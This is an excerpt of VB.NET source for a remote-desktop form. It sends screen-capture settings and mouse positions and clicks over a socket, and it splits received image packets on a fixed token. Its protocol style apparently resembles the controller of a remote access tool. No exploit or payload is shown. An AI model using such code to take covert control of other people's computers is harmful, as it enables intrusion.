Public Class Remote
    ...
    Public Sub PktToImage(ByVal BY As Byte())
        If active Then
            F.S.Send(Sock, "@" & Main.Sep & C1.SelectedIndex & Main.Sep & C2.Text & Main.Sep & C.Value)
        End If
        If op = Nothing Then
        Else
            If active Then
                If MouseCheckBox.Checked = True Then
                    ...
                    pp.Y = op.Y
                    op = Nothing
                    F.S.Send(Sock, "$" & Main.Sep & pp.X & Main.Sep & pp.Y & Main.Sep)
                End If
            End If
        End If

        Dim B As Array = fx(BY, "el8le")
    ...
    Private Sub P1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseDown
        If MouseCheckBox.Checked = True Then
            ...
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 8
            End If
            F.S.Send(Sock, "#" & Main.Sep & PP.X & Main.Sep & PP.Y & Main.Sep & but)
        End If
    End Sub
